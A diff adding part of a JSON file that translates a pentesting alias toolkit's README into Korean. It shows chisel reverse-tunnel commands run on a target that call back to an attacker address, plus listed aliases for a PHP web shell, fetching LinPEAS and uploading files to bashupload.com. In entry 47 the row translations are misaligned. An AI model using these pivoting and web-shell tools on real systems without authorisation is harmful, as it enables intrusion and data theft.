+    "Translation": "```\n┌──(22sh㉿kali)-[~/jazz]\n└─$ chisel_socks 10.10.14.10 8888\n[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard\n2024/08/05 23:31:03 server: Reverse tunnelling enabled\n2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44=\n2024/08/05 23:31:03 server: Listening on http://0.0.0.0:8888\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "FsQhnV1ZDXQKYJwmnmwkG+G/Yhv6Th/aEh8qMiTCapA=",
+        "originContent": "┌──(22sh㉿kali)-[~/jazz]",
+        "translatedContent": "┌──(22sh㉿kali)-[~/jazz]"
+      },
+      {
+        "row": 3,
+        "rowsha": "je+N6keK9cEX9d/Q5FJCNgy1+/Q3h/H8Q2u6S1xzMGU=",
+        "originContent": "└─$ chisel_socks 10.10.14.10 8888",
+        "translatedContent": "└─$ chisel_socks 10.10.14.10 8888"
+      },
+      {
+        "row": 4,
+        "rowsha": "qI7d6jBIr2IcfIT3EQfs/n+g0SuJtUmoNmKtsSaUvm8=",
+        "originContent": "[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard",
+        "translatedContent": "[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard"
+      },
+      {
+        "row": 5,
+        "rowsha": "HKPgjbivER/L0/S/m7og7VzCjp9nvpmIXA9zF9oLYsE=",
+        "originContent": "2024/08/05 23:31:03 server: Reverse tunnelling enabled",
+        "translatedContent": "2024/08/05 23:31:03 server: Reverse tunnelling enabled"
+      },
+      {
+        "row": 6,
+        "rowsha": "Qiex+B1rn3qCJvzIHaPC34lGk373FNnn/4KsLbJd3RE=",
+        "originContent": "2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44=",
+        "translatedContent": "2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44="
+      },
+      {
+        "row": 7,
+        "rowsha": "vSNd4btjkMdNZVXcjAr9Di4qdjB+Qb76yixuxOSiMOE=",
+        "originContent": "2024/08/05 23:31:03 server: Listening on http://0.0.0.0:8888",
+        "translatedContent": "2024/08/05 23:31:03 server: Listening on http://0.0.0.0:8888"
+      },
+      {
+        "row": 8,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 43,
+    "Content": "### > chisel_forward $local_ip $local_port $remote_ip $remote_port\nSets up port forwarding using Chisel.\nExample:\n",
+    "ContentSha": "SE3zUqGyzxPp+l7dJZ4GY6Jh5unhTLp6PD6ZjqMWW+o=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "### > chisel_forward $local_ip $local_port $remote_ip $remote_port\nChisel을 사용하여 포트 포워딩을 설정합니다.\n예:\n",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "JRkDj+QesiHUETA6fef6cru7SuWW+YT5i+IoLHkJOyE=",
+        "originContent": "### > chisel_forward $local_ip $local_port $remote_ip $remote_port",
+        "translatedContent": "### > chisel_forward $local_ip $local_port $remote_ip $remote_port"
+      },
+      {
+        "row": 2,
+        "rowsha": "mgXcU6U3GFhG+2yjbwbyPOKQsxlIpsaUwybiYKl9hgc=",
+        "originContent": "Sets up port forwarding using Chisel.",
+        "translatedContent": "Chisel을 사용하여 포트 포워딩을 설정합니다."
+      },
+      {
+        "row": 3,
+        "rowsha": "hyiH5WPnWVf/wgsCEzJQTy3dCo85ZMuTBwhjv68Tza0=",
+        "originContent": "Example:",
+        "translatedContent": "예:"
+      },
+      {
+        "row": 4,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 44,
+    "Content": "```\n┌──(22sh㉿kali)-[~/jazz]\n└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080\n[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080\n[+] Run this on the target machine\n2024/08/05 23:32:30 server: Reverse tunnelling enabled\n2024/08/05 23:32:30 server: Fingerprint x2iuHfzYVOWXL/7Gw0a6AjXhMIg8WP7AqZwlDuRasQw=\n2024/08/05 23:32:30 server: Listening on http://0.0.0.0:8888\n```",
+    "ContentSha": "Q5dXgPyfAHowl7nzYGEzlM7dC5VXc5GolZyZzssNBXE=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n┌──(22sh㉿kali)-[~/jazz]\n└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080\n[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080\n[+] Run this on the target machine\n2024/08/05 23:32:30 server: Reverse tunnelling enabled\n2024/08/05 23:32:30 server: Fingerprint x2iuHfzYVOWXL/7Gw0a6AjXhMIg8WP7AqZwlDuRasQw=\n2024/08/05 23:32:30 server: Listening on http://0.0.0.0:8888\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "FsQhnV1ZDXQKYJwmnmwkG+G/Yhv6Th/aEh8qMiTCapA=",
+        "originContent": "┌──(22sh㉿kali)-[~/jazz]",
+        "translatedContent": "┌──(22sh㉿kali)-[~/jazz]"
+      },
+      {
+        "row": 3,
+        "rowsha": "9otPe/HQtYeFUYFbNNnhaBcbpwMyRAgfwcXfNqeL2p4=",
+        "originContent": "└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080",
+        "translatedContent": "└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080"
+      },
+      {
+        "row": 4,
+        "rowsha": "5k6wXPokKPNKp5cTYJ5y9x+KrslVCQbfawvMNQbS530=",
+        "originContent": "[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080",
+        "translatedContent": "[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080"
+      },
+      {
+        "row": 5,
+        "rowsha": "t5uxR79DRnb14R+jKoYk9FooTpbIMVjeQCw7Bi7ZNgI=",
+        "originContent": "[+] Run this on the target machine",
+        "translatedContent": "[+] Run this on the target machine"
+      },
+      {
+        "row": 6,
+        "rowsha": "eL40uUsk+3oXveZchgRK+YroNrrIxYEZbQKbvV2jhYc=",
+        "originContent": "2024/08/05 23:32:30 server: Reverse tunnelling enabled",
+        "translatedContent": "2024/08/05 23:32:30 server: Reverse tunnelling enabled"
+      },
+      {
+        "row": 7,
+        "rowsha": "iBX7Mw1VFpfQm0qXwxbRQKrx3qKIQVY0MSfEq8Jh9PQ=",
+        "originContent": "2024/08/05 23:32:30 server: Fingerprint x2iuHfzYVOWXL/7Gw0a6AjXhMIg8WP7AqZwlDuRasQw=",
+        "translatedContent": "2024/08/05 23:32:30 server: Fingerprint x2iuHfzYVOWXL/7Gw0a6AjXhMIg8WP7AqZwlDuRasQw="
+      },
+      {
+        "row": 8,
+        "rowsha": "1aMdL6M2pCw80RE44jV7KG6L1Cru61JTVP3EP8HR6vA=",
+        "originContent": "2024/08/05 23:32:30 server: Listening on http://0.0.0.0:8888",
+        "translatedContent": "2024/08/05 23:32:30 server: Listening on http://0.0.0.0:8888"
+      },
+      {
+        "row": 9,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 45,
+    "Content": "## Host Management\n### > addhost $ip $hostname\nAdds or updates an entry in the /etc/hosts file.\nExample:",
+    "ContentSha": "+ugSN051bp7NxJ71akhMrJKbkx1N4jFxEkyX/oh20sU=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "## 호스트 관리\n### > addhost $ip $hostname\n/etc/hosts 파일에 항목을 추가하거나 업데이트합니다.\n예시:",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "2tSXyZfSFQ2Z3FI+yxuuDz144ndwjaNGoAMsI1Ra6RU=",
+        "originContent": "## Host Management",
+        "translatedContent": "## 호스트 관리"
+      },
+      {
+        "row": 2,
+        "rowsha": "nBVd6aS4566+YXyM3wnUdoX6tdFs6vNS+gGcqha8eow=",
+        "originContent": "### > addhost $ip $hostname",
+        "translatedContent": "### > addhost $ip $hostname"
+      },
+      {
+        "row": 3,
+        "rowsha": "YPPgX0sDAu06d8354VWnKDXKBVmObmtMBT9PvGAh17o=",
+        "originContent": "Adds or updates an entry in the /etc/hosts file.",
+        "translatedContent": "/etc/hosts 파일에 항목을 추가하거나 업데이트합니다."
+      },
+      {
+        "row": 4,
+        "rowsha": "hyiH5WPnWVf/wgsCEzJQTy3dCo85ZMuTBwhjv68Tza0=",
+        "originContent": "Example:",
+        "translatedContent": "예시:"
+      }
+    ],
+    "IsCodeBlock": false
+  },
+  {
+    "Id": 46,
+    "Content": "```\n┌──(22sh㉿kali)-[~/jazz]\n└─$ addhost 10.10.11.234 big.box.htb \n[+] Appended big.box.htb to existing entry for 10.10.11.234 in /etc/hosts\n10.10.11.234 boss.htb big.boss.htb big.box.htb\n\n\n┌──(22sh㉿kali)-[~/jazz]\n└─$ addhost 10.10.11.235 newbox.htb \n[+] Added new entry: 10.10.11.235 newbox.htb to /etc/hosts\n10.10.11.235 newbox.htb\n```",
+    "ContentSha": "DDsmyJHjtVbpmeJB5TEMJJl8Lp9cK9kdewsGcvkMxVA=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "```\n┌──(22sh㉿kali)-[~/jazz]\n└─$ addhost 10.10.11.234 big.box.htb \n[+] Appended big.box.htb to existing entry for 10.10.11.234 in /etc/hosts\n10.10.11.234 boss.htb big.boss.htb big.box.htb\n\n\n┌──(22sh㉿kali)-[~/jazz]\n└─$ addhost 10.10.11.235 newbox.htb \n[+] Added new entry: 10.10.11.235 newbox.htb to /etc/hosts\n10.10.11.235 newbox.htb\n```",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      },
+      {
+        "row": 2,
+        "rowsha": "FsQhnV1ZDXQKYJwmnmwkG+G/Yhv6Th/aEh8qMiTCapA=",
+        "originContent": "┌──(22sh㉿kali)-[~/jazz]",
+        "translatedContent": "┌──(22sh㉿kali)-[~/jazz]"
+      },
+      {
+        "row": 3,
+        "rowsha": "ecpN/TXxL+u/HTssNA7XXji/xuYOVbk7quF9w/U0Tt0=",
+        "originContent": "└─$ addhost 10.10.11.234 big.box.htb ",
+        "translatedContent": "└─$ addhost 10.10.11.234 big.box.htb "
+      },
+      {
+        "row": 4,
+        "rowsha": "4mr0d45y9gkrAR0umaByCKvt7vtfTyABmiS96fU41KM=",
+        "originContent": "[+] Appended big.box.htb to existing entry for 10.10.11.234 in /etc/hosts",
+        "translatedContent": "[+] Appended big.box.htb to existing entry for 10.10.11.234 in /etc/hosts"
+      },
+      {
+        "row": 5,
+        "rowsha": "1xUEIONkHYRgk2mj0hYDGZse4uDr9+6u5X6LpB0pMT8=",
+        "originContent": "10.10.11.234 boss.htb big.boss.htb big.box.htb",
+        "translatedContent": "10.10.11.234 boss.htb big.boss.htb big.box.htb"
+      },
+      {
+        "row": 6,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 7,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": ""
+      },
+      {
+        "row": 8,
+        "rowsha": "FsQhnV1ZDXQKYJwmnmwkG+G/Yhv6Th/aEh8qMiTCapA=",
+        "originContent": "┌──(22sh㉿kali)-[~/jazz]",
+        "translatedContent": "┌──(22sh㉿kali)-[~/jazz]"
+      },
+      {
+        "row": 9,
+        "rowsha": "FdSsg+fAHMqZhTHLDwRHuy+r4iGhjTBLrlu3VTMRQqs=",
+        "originContent": "└─$ addhost 10.10.11.235 newbox.htb ",
+        "translatedContent": "└─$ addhost 10.10.11.235 newbox.htb "
+      },
+      {
+        "row": 10,
+        "rowsha": "ZI7v/GhuJaSS5llC74BoP3cplbuhAIzKGoqzeoKBYvE=",
+        "originContent": "[+] Added new entry: 10.10.11.235 newbox.htb to /etc/hosts",
+        "translatedContent": "[+] Added new entry: 10.10.11.235 newbox.htb to /etc/hosts"
+      },
+      {
+        "row": 11,
+        "rowsha": "THlsUP646hVNIqbpox5/7B0L1MvfiedsAfE44vmujbY=",
+        "originContent": "10.10.11.235 newbox.htb",
+        "translatedContent": "10.10.11.235 newbox.htb"
+      },
+      {
+        "row": 12,
+        "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+        "originContent": "```",
+        "translatedContent": "```"
+      }
+    ],
+    "IsCodeBlock": true
+  },
+  {
+    "Id": 47,
+    "Content": "\n\n## Additional Aliases\n- `linpeas`: Downloads the latest version of LinPEAS.\n- `upload`: Uploads a file using bashupload.com.\n- `phpcmd`: Creates a simple PHP web shell.\n- `burl`: curl using burpsuite proxy.",
+    "ContentSha": "B8S4kTIVWqWblh2ig/r+PhCZsVRnIhcnJ248qh1btf8=",
+    "SectionType": "",
+    "StartLine": 0,
+    "EndLine": 0,
+    "Translation": "## 추가 별칭\n- `linpeas`: 최신 버전의 LinPEAS를 다운로드합니다.\n- `upload`: bashupload.com을 사용하여 파일을 업로드합니다.\n- `phpcmd`: 간단한 PHP 웹 셸을 생성합니다.\n- `burl`: burpsuite 프록시를 사용하여 curl을 실행합니다.\n\n",
+    "Status": "ok",
+    "RowTranslations": [
+      {
+        "row": 1,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "## 추가 별칭"
+      },
+      {
+        "row": 2,
+        "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+        "originContent": "",
+        "translatedContent": "- `linpeas`: 최신 버전의 LinPEAS를 다운로드합니다."
+      },
+      {
+        "row": 3,
+        "rowsha": "SE+uc7B6/HAMK3uVdz260OyOP02iHrrB83eIXEDFahE=",
+        "originContent": "## Additional Aliases",
+        "translatedContent": "- `upload`: bashupload.com을 사용하여 파일을 업로드합니다."
+      },
+      {
+        "row": 4,
+        "rowsha": "aKNbgoVAlxIfcvv112kJr4TmNko49WpcGDTYU+8oI48=",
+        "originContent": "- `linpeas`: Downloads the latest version of LinPEAS.",
+        "translatedContent": "- `phpcmd`: 간단한 PHP 웹 셸을 생성합니다."
+      },
+      {
+        "row": 5,
+        "rowsha": "32gJGTWVn5Aq5U6czxhTbsBk+nkjZaqg6T/SW8Ranko=",
+        "originContent": "- `upload`: Uploads a file using bashupload.com.",
+        "translatedContent": "- `burl`: burpsuite 프록시를 사용하여 curl을 실행합니다."
+      },
+      {
+        "row": 6,
+        "rowsha": "RjlBCgumNaFYPuhQj7v4nRPHEUa/QtN7Nk2GMicFQvw=",
+        "originContent": "- `phpcmd`: Creates a simple PHP web shell.",
+        "translatedContent": ""
+      },
+      {
+        "row": 7,
+        "rowsha": "uAy0CqhS0reLyGgvEh4B6NKJcquQwZeakZZzKynMkzo=",
+        "originContent": "- `burl`: curl using burpsuite proxy.",
+        "translatedContent": ""
+      }
+    ],
+    "IsCodeBlock": false
+  }
+]
